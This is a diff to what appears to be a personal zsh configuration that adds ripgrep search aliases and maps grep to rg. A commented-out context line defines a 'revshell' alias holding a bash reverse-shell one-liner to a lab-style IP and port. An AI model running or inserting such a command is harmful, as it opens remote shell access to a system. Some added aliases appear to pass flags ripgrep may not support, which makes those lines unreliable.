@@ -32,3 +32,31 @@ alias reload='source ~/.zshrc'
 #alias revshell='bash -i >& /dev/tcp/10.10.14.6/4444 0>&1'
 alias serve='python3 -m http.server 8000'
 
+####################### Ripgrep ####################
+#                                                  #
+# Basic enhanced search with common useful flags   #
+#                                                  #
+####################################################
+alias rg='rg --smart-case --hidden --glob "!.git/*"'
+
+# Code-focused search (excludes common non-code files)
+alias rgc='rg --smart-case --hidden --type-not log --type-not binary --glob "!.git/*" --glob "!node_modules/*" --glob "!*.min.*" --glob "!dist/*" --glob "!build/*"'
+
+# Search with context (shows 3 lines before/after matches)
+alias rgx='rg --smart-case --hidden --context 3 --glob "!.git/*"'
+
+# Pretty output for piping to less
+alias rgp='rg --smart-case --hidden --pretty --glob "!.git/*"'
+
+# Search in specific file types
+alias rgjs='rg --smart-case --type js --type ts --type jsx --type tsx'
+alias rgpy='rg --smart-case --type py'
+alias rgyml='rg --smart-case --type yaml'
+alias rgmd='rg --smart-case --type md'
+
+####
+# Replace grep with ripgrep
+alias grep='rg'
+alias egrep='rg'
+alias fgrep='rg --fixed-strings'
+alias rgrep='rg --recursive'
